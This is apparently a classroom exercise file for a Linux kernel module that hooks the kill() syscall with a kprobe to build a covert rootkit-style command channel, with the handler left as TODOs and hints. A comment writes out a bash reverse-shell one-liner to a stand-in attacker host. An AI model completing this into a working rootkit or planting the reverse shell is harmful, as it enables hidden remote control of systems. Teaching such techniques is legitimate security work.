/*
 * c2_demo.c — In-class exercise: Covert C2 via kill() signal hooking
 *
 * Hooks __arm64_sys_kill with a kprobe. When signal == 62, intercepts
 * the call as a C2 command encoded in the PID argument:
 *
 *   kill -62 0   → STATUS  (print current toggle states)
 *   kill -62 1   → toggle "process hiding"
 *   kill -62 2   → toggle "directory hiding"
 *   kill -62 3   → spawn a process from kernel (simulated reverse shell)
 *
 * The magic signal is swallowed by rewriting the syscall arguments to
 * kill(self, 0) — a harmless existence check. The sending process
 * does not receive signal 62.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <asm/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("In-class C2 demo — signal hooking with kprobes");

#define MAGIC_SIGNAL 62

#define CMD_STATUS          0
#define CMD_TOGGLE_PROCHIDE 1
#define CMD_TOGGLE_DIRHIDE  2
#define CMD_SPAWN_SHELL     3

/* ── Feature toggles ──────────────────────────────────────────────── */

static bool prochide_active;
static bool dirhide_active;

/* ── Deferred work: spawn process from kernel ─────────────────────
 *
 * call_usermodehelper() can sleep, so we can't call it directly from
 * a kprobe handler (atomic context). Instead, we schedule work on the
 * default kernel workqueue. The kworker thread runs in process context
 * where sleeping is allowed.
 *
 * In a real rootkit, the spawned command would be a reverse shell:
 *   /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
 *
 * Here we just touch a marker file as proof of concept.
 * ─────────────────────────────────────────────────────────────────── */

static void spawn_work_fn(struct work_struct *w)
{
	/* The command to run in userspace */
	char *argv[] = {
		"/bin/sh", "-c",
		"echo kernel-spawned > /tmp/kernel_spawned",
		NULL
	};
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	pr_info("c2_demo: spawning process from kernel (simulated reverse shell)\n");
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	kfree(w);
}

static void schedule_spawn(void)
{
	struct work_struct *work;

	work = kmalloc(sizeof(*work), GFP_ATOMIC);
	if (!work) {
		pr_err("c2_demo: failed to allocate spawn work\n");
		return;
	}
	INIT_WORK(work, spawn_work_fn);
	schedule_work(work);
}

/* ── Kprobe pre-handler ───────────────────────────────────────────── */

static int c2_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
	/*
	 * TODO 1: Get the user pt_regs from the wrapper pt_regs.
	 *
	 * On AArch64, __arm64_sys_kill is a wrapper. The real user
	 * registers (containing the syscall arguments) are passed as
	 * a pointer in regs->regs[0].
	 *
	 * Hint: struct pt_regs *user_regs = (struct pt_regs *)regs->regs[0];
	 */

	/*
	 * TODO 2: Extract the signal number and command code.
	 *
	 * For kill(pid, sig):
	 *   - pid (our command code) is in user_regs->regs[0]
	 *   - sig (signal number)    is in user_regs->regs[1]
	 *
	 * If the signal is NOT MAGIC_SIGNAL, return 0 immediately
	 * to let normal kill() calls pass through.
	 */

	/*
	 * TODO 3: Dispatch the command.
	 *
	 * Switch on the command code:
	 *   CMD_STATUS (0):  pr_info the current state of both toggles
	 *   CMD_TOGGLE_PROCHIDE (1): flip prochide_active, log new state
	 *   CMD_TOGGLE_DIRHIDE  (2): flip dirhide_active,  log new state
	 *   CMD_SPAWN_SHELL (3): call schedule_spawn() — already implemented above
	 *   default: pr_warn unknown command
	 *
	 * Use pr_info with prefix "c2_demo:" so tests can grep for it.
	 */

	/*
	 * TODO 4: Swallow the signal.
	 *
	 * Rewrite user_regs so the kernel executes kill(self, 0)
	 * instead of the original kill(cmd, 62):
	 *
	 *   user_regs->regs[0] = current->pid;   // target = self
	 *   user_regs->regs[1] = 0;              // signal = 0 (existence check)
	 *
	 * This prevents signal 62 from being delivered to anyone.
	 */

	return 0;
}

/* ── Kprobe definition ────────────────────────────────────────────── */

static struct kprobe c2_kp = {
	.symbol_name = "__arm64_sys_kill",
	.pre_handler = c2_pre_handler,
};

/* ── Module init / exit ───────────────────────────────────────────── */

static int __init c2_demo_init(void)
{
	int ret;

	ret = register_kprobe(&c2_kp);
	if (ret < 0) {
		pr_err("c2_demo: kprobe registration failed: %d\n", ret);
		return ret;
	}

	pr_info("c2_demo: C2 active on signal %d\n", MAGIC_SIGNAL);
	return 0;
}

static void __exit c2_demo_exit(void)
{
	unregister_kprobe(&c2_kp);
	pr_info("c2_demo: kprobe removed\n");
}

module_init(c2_demo_init);
module_exit(c2_demo_exit);
